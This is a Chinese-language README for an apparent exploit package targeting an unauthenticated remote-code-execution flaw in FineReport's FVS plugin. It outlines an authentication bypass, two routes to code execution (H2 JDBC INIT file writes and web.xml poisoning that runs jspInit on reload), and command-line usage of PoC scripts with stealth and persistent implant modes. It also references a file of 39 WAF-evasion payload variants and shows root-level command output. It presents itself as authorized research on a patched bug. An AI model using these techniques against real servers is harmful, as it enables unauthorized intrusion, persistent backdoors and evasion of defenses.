# 帆软 FineReport FVS 插件未授权 RCE（fr-fvs-unauth-rce）

- **影响**：FineReport < 11.5.16（FVS/Duchamp 复用资源链路；实验基线 11.5.15 + wysiwyg 插件 4.13.0）
- **修复**：升级 FineReport 至 11.5.16（插件 4.15.0 加鉴权卫兵，同载荷对照已证失效）
- **定性**：未认证远程代码执行，命令以应用进程权限运行（实验容器内 uid=0）
- **情报**：某厂商安全团队 2026-11 公开通告"三重缺陷叠加"；无公开 PoC，本包为独立复现

## 一个鉴权缺陷，两个 RCE 出口

```
?tplPath=reportlets 归一化为空 → 绕过登录校验（未授权调用上传/apply）
├── 路线一 poc-h2.py     props.name 注入 jdbc:h2 URL 的 INIT
│                        → CALL FILE_WRITE 任意路径任意后缀任意大小写
│                        ├── 交互模式: JSP 写入默认 context(ROOT) → GET ?c= 即时执行
│                        └── 植入模式(--implant): 两枪写 WEB-INF/web.xml(投毒)
│                             + x.env(jspInit) → 重载时自动执行, 零触发请求
└── 路线二 poc-attach.py  包内附件清单写 WEB-INF（.env/.xml 过后缀白名单）
                         → web.xml 投毒（jsp-file + load-on-startup）
                         → 容器重载时 Jasper 预编译 → jspInit() 自动执行
                         → 命令输出落 webroot 静态文件回显（零触发请求）
```

两种"重载即执行"完全同机制：`<jsp-file>` + `<load-on-startup>` → 重载预编译 →
生成 servlet 初始化 → `jspInit()` 运行——对应公开通告"容器检测到配置变更后重载，
写入的代码随之被解析执行"。

## 文件

| 文件 | 内容 |
|---|---|
| `poc-h2.py` | 路线一 PoC（纯 Python3 标准库零依赖）。**交互模式**：上传→apply→触发→回读，5 种实测形态（含 `--shape stealth` 全隐身）；**植入模式 `--implant`**：两枪写入投毒 web.xml + jspInit（`||/*q*/` 斜杠注释切块解除 255B 组件限制，任意大小文件），重载时零触发执行 |
| `poc-attach.py` | 路线二 PoC：附件层写 WEB-INF/web.xml + x.env（jspInit 命令固化），自动轮询等待重载生效并回读 |
| `vulnerability-analysis.md` | 双路线原理分析：鉴权缺陷 + 两个出口的反编译实证 + 判决实验 + 重载触发边界 + 修复面 |
| `waf-variants.md` | 39 个规避变体全集，**每个含可直接复制的完整载荷原文**与有效/死因（含 X13 任意长度写入原语），附检测侧逐条封堵建议 |

## 快速开始（仅限授权靶场）

```bash
# ========== 路线一（H2 数据连接层） ==========

# 交互模式（默认）：GET ?c= 参数化, 即时执行
python3 poc-h2.py -t http://<靶场>:18081                        # 默认命令: id/hostname/date 落地并回读
python3 poc-h2.py -t http://<靶场>:18081 -c "id"
python3 poc-h2.py -t http://<靶场>:18081 --shape stealth        # 全隐身: \u全转义+CHAR拼后缀+hex切块
                                                                #         +编码路由+body参数+绝对URI

# 植入模式：两枪写 WEB-INF/web.xml + x.env(jspInit), 重载时自动执行(零触发请求)
python3 poc-h2.py -t http://<靶场>:18081 --implant
python3 poc-h2.py -t http://<靶场>:18081 --implant -c "id" --wait 300

# ========== 路线二（附件层 web.xml 投毒） ==========

# 命令写入时固化进 jspInit; 容器重载时自动执行
python3 poc-attach.py -t http://<靶场>:18081
python3 poc-attach.py -t http://<靶场>:18081 -c "id" --wait 300
```

## 实测输出（自建靶场，2026-11-22）

交互模式（两条路线同款收尾）：

```
[3] trigger -> 200  waitFor=0
[4] readback-> 200
PWN-FVS-UNAUTH-RCE
uid=0(root) gid=0(root) groups=0(root)
<容器hostname>
2026年 11月 22 日 ...
```

植入/重载模式（重载后**不对目标发起任何请求**，直接读输出文件）：

```
[3] 等待重载(最长 180s, 每 6s 探测回读文件)...
    命令已在重载中执行（无需任何触发请求）:
----------------------------------------------
PWN-H2-IMPLANT
uid=0(root) gid=0(root) groups=0(root)
<容器hostname>
----------------------------------------------
```

## 说明与边界

- **交互模式写哪里**：默认 `/usr/local/tomcat/webapps/ROOT`（官方 Docker 布局的默认
  context）。直接写 webroot 会被 security.enhance 插件的 JSP-Monitor 秒级改名
  `.blocked`；非 Docker 部署用 `--write-dir` 调整
- **重载何时发生**：自动 reloadable 环境在配置变更后即刻；本实验栈（FR 定制 Tomcat）
  实测即使开 reloadable 也不自动重载，用容器重启等价触发（66s）。生产上任何
  重启/发版/重部署/崩溃恢复都会引爆投毒配置——攻击面等价，只是引爆时机不同
- **FR 不受影响**：FR 本体无自带 web.xml（servlet 走注解注册），新写入的 web.xml
  不含 metadata-complete，重启后登录页 200 实证功能完好
- **还原靶场**：删除 `WEB-INF/web.xml` 与 `WEB-INF/x.env` 后重启即净
- 两路线前置条件相同：目标装有 FVS 插件（H2 为插件自带、触发开关在攻击者包内，
  零服务端配置、零外部数据库）
- 实验环境：FR 11.5.15 引擎容器（宿主 18081→8080）；11.5.16 修复对照镜像已归档验证

## 免责

仅用于授权安全测试、自有靶场复现与防御研究，禁止对生产环境或他人资产使用。
本漏洞已由厂商修复并公开通告；全部实验在自建靶场完成，不含真实目标信息或凭据。
